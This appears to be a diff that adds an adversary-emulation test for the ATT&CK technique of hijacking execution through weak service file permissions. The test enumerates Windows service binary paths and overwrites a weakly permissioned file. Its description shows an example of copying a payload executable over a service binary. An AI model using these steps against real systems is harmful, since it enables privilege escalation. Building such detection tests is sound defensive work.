@@ -1,0 +1,48 @@
+attack_technique: T1574.010
+display_name: 'Hijack Execution Flow: Services File Permissions Weakness'
+atomic_tests:
+- name: File System Permissions Weakness
+  auto_generated_guid: 0cb5ad48-7d61-48ac-bd4e-503d5b519dac
+  description: |
+    This test to show checking file system permissions weakness and which can lead to privilege escalation by replacing malicious file. Example; check weak file permission and then replace.
+    powershell -c "Get-WmiObject win32_service | select PathName"   (check service file location) and
+    copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
+
+    Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
+    the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
+  supported_platforms:
+  - windows
+  input_arguments:
+    malicious_file:
+      description: File to replace weak permission file with
+      type: path
+      default: $env:TEMP\T1574.010\T1574.010_malicious_file.txt
+    weak_permission_file:
+      description: check weak files permission
+      type: path
+      default: $env:TEMP\T1574.010_weak_permission_file.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A file must exist on disk at specified location (#{weak_permission_file})
+    prereq_command: |
+      if (Test-Path #{weak_permission_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item #{weak_permission_file} -Force | Out-Null
+      Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
+  - description: |
+      A file to replace the original weak_permission_file. In an attack this would be the malicious file gaining extra privileges
+    prereq_command: |
+      if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
+      New-Item #{malicious_file} -Force | Out-Null
+      Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
+  executor:
+    command: |
+      Get-WmiObject win32_service | select PathName
+      Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
+    cleanup_command: |
+      Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
+      Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
+    name: powershell
